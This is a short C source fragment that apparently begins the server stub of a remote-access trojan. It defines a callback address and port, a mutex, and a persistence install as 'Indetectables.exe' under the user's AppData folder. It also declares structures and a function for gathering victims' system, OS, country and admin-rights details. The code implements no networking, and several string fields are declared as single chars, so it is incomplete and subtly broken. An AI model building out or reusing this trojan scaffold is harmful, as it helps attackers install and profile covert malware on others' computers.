#include <windows.h>

#define CONNECTION_IP "127.0.0.1"
#define CONNECTION_PORT 1234
#define CONNECTION_PASSWORD
#define SERVER_MUTEX "{1234-1234}"
#define SERVER_GROUP "Default"
#define SERVER_INSTALL_NAME "Indetectables.exe"
#define SERVER_INSTALL_PATH getenv("APPDATA")

struct COMPUTER
{
    char NAME, RAM;
    char ARCHITECTURE[3]; //x86 or x64
} info_comp;

struct OS
{
    char CAPTION /* I.E: Windows 7 */, BUILD_NUMBER, MINOR_VERSION, MAJOR_VERSION;
} info_os;

struct USER
{
    char NAME, COUNTRY, COUNTRY_SHORT; //COUNTRY = Spain, COUNTRY_SHORT = ES
    BOOL IS_ADMIN; //Has admin rights
} info_user;

void GatherInformation();
